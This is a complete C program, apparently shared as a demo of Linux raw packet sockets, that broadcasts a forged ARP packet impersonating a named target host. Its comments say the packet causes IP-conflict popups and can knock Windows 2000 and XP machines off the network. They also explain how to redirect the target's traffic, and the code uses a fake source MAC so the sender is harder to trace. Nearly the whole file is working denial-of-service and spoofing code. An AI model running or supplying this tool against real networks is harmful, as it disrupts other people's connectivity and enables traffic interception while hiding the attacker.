/**

A simple program that sends out a handcrafted ARP packet. The program takes a hostname as
target. The ARP packet is created such that it looks like it is been sent from the 
"target".

If the target is a Win2000 or WinXP machine, the target IP stack treat's this ARP packet
as evidence of IP collision and a popup is displayed to the target-user. Networking on
the target box can be severly affected including complete loss of networking.

The target machine can be brought back on the network by Disabling and then Enabling
the network card or by rebooting the machine.

Note that this program sends out a dummy MAC "ee:ee:ee:ee:ee:ee". Replacing this mac
with the actual MAC of another "masquerading" machine can potentially cause IP packets 
intended for the target machine to be sent to the "masquerading" machine.

This is just a program to demo PF_PACKET capabilities on Linux and to point out the fact
that networking mostly works on trust :)

Tested on Linux 2.6.11. You have to be root to run this program
gcc pong.c -o pong

saju.pillai@gmail.com
**/
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>

#define DIE 1
#define MSG_ONLY 0

extern int optind, opterr, optopt;
extern char *optarg;

/**
An ipv4 ARP packet
**/
typedef struct {
  unsigned short htype;
  unsigned short ptype;
  unsigned char  hlen;
  unsigned char  plen;
  unsigned short mode;
  unsigned char  sender_mac[6];
  unsigned char  sender_ip[4];
  unsigned char  target_mac[6];
  unsigned char  target_ip[4];
} arp_packet;

/**
The full ethernet frame for a ipv4 ARP packet
**/
typedef struct {
  unsigned char  dest[6];
  unsigned char  src[6];
  unsigned short eth_type;
  arp_packet     arp;
} ether_packet;

void do_msg(int die, char *msg, ...)
{
  char ebuf[1024];
  va_list list;

  va_start(list, msg);
  vsprintf(ebuf, msg, list);
  va_end(list);

  perror(msg);

  if (die)
    exit(-1);
}

void usage()
{
  char *blurb = "./pong -t <target>";

  fprintf(stderr, "%s\n", blurb);
  exit(0);
}

void banner(char *target)
{
  printf("Hosing %s\n", target);
}

char *lookup(char *host, struct sockaddr_in *t_addr, char **msg)
{
  struct addrinfo hint, *res, *r;
  int i;

  memset(&hint, 0, sizeof(hint));
  hint.ai_family = PF_INET;

  if ((i = getaddrinfo(host, NULL, &hint, &res))) {
    *msg = (char *)gai_strerror(i);
    return NULL;
  }
   
  memcpy(t_addr, res->ai_addr, res->ai_addrlen);
  return inet_ntoa(t_addr->sin_addr);
}

void init_MAC_addr(int pf, char *interface, char *addr, int *card_index)
{
  int r;
  struct ifreq card;

  strcpy(card.ifr_name, interface);

#ifdef SEND_MY_MAC
  if (ioctl(pf, SIOCGIFHWADDR, &card) == -1)
    do_msg(DIE, "Could not get MAC address for %s", card.ifr_name);

  memcpy(addr, card.ifr_hwaddr.sa_data, 6);
#else
  /**
     To make it harder for people to figure out who sent this ARP message we use a fake
     SRC MAC address.
  **/
  memset(addr, 0xEE, 6);
#endif
  if (ioctl(pf, SIOCGIFINDEX, &card) == -1)
    do_msg(DIE, "Could not find device index number for %s", card.ifr_name);

  *card_index = card.ifr_ifindex;

#ifdef DEBUG
#define MAC(i) card.ifr_hwaddr.sa_data[i]
  printf("MAC is %02x:%02x:%02x:%02x:%02x:%02x\n",
	 MAC(0), MAC(1), MAC(2), MAC(3), MAC(4), MAC(5));
  printf("%s index is %d\n", interface, *card_index);
#endif
}

void send_arp(int pf, unsigned int ip, char *my_mac, struct sockaddr_ll *device)
{
  int bytes;
  ether_packet epacket;
  struct in_addr arbitrary_ip;

  inet_aton("1.2.3.4", &arbitrary_ip);

  memset(epacket.dest, 0xFF, 6);
  memcpy(epacket.src, my_mac, 6);
  epacket.eth_type = htons(0x806);
  epacket.arp.htype = htons(0x1);
  epacket.arp.ptype = htons(0x800);
  epacket.arp.hlen = 0x6;
  epacket.arp.plen = 0x4;
  epacket.arp.mode = htons(0x1);
  memcpy(epacket.arp.sender_mac, my_mac, 6);
  memcpy(epacket.arp.sender_ip, &ip, 4);
  memset(epacket.arp.target_mac, 0xFF, 6);
  memcpy(epacket.arp.target_ip, (char *)&arbitrary_ip, 4);
  
  bytes = sendto(pf, &epacket, sizeof(epacket), 0, (const struct sockaddr *)device, 
		 sizeof(*device));
  if (bytes <= 0) 
    do_msg(DIE, "ARP packet write() error");
}

int main(int argc, char **argv)
{
  char ch, mac[6];
  char *target, *emsg;
  struct sockaddr_in t_addr;
  int pf, card_index;
  struct sockaddr_ll device;
  

  while ((ch = getopt(argc, argv, "t:")) != -1) {
    switch(ch) 
      {
      case 't':
	if (!(target = lookup(optarg, &t_addr, &emsg)))
	  do_msg(DIE, emsg);
	break;

      default:
	usage();
	break;
      }
  }

  if (!target)
    usage();
  banner(target);  
  

  if ((pf = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    do_msg(DIE, "Could not create packet socket");

  memset(&device, 0, sizeof(device));
  init_MAC_addr(pf, "eth0", mac, &device.sll_ifindex);

  device.sll_family = AF_PACKET;
  memcpy(device.sll_addr, mac, 6);
  device.sll_halen = htons(6);
  
  send_arp(pf, *(unsigned int *)&t_addr.sin_addr, mac, &device);

  return 0;
}
